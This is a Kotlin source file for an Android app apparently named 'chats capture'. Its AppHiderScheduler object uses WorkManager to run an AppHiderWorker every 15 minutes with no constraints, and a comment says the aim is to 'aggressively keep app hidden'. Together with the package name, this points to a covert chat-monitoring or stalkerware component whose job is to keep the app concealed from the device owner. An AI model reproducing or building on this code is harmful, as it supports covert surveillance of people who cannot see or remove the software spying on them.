package com.chats.capture.workers

import android.content.Context
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import timber.log.Timber
import java.util.concurrent.TimeUnit

object AppHiderScheduler {
    
    private const val WORK_NAME = "app_hider_work"
    
    /**
     * Schedule periodic work to ensure app stays hidden
     */
    fun schedule(context: Context) {
        try {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.NOT_REQUIRED)
                .setRequiresBatteryNotLow(false)
                .setRequiresCharging(false)
                .build()
            
            // Run every 15 minutes to aggressively keep app hidden
            val workRequest = PeriodicWorkRequestBuilder<AppHiderWorker>(
                15, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .build()
            
            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
            
            Timber.d("AppHiderWorker scheduled")
        } catch (e: Exception) {
            Timber.e(e, "Error scheduling AppHiderWorker")
        }
    }
    
    /**
     * Cancel the scheduled work
     */
    fun cancel(context: Context) {
        try {
            WorkManager.getInstance(context).cancelUniqueWork(WORK_NAME)
            Timber.d("AppHiderWorker cancelled")
        } catch (e: Exception) {
            Timber.e(e, "Error cancelling AppHiderWorker")
        }
    }
}
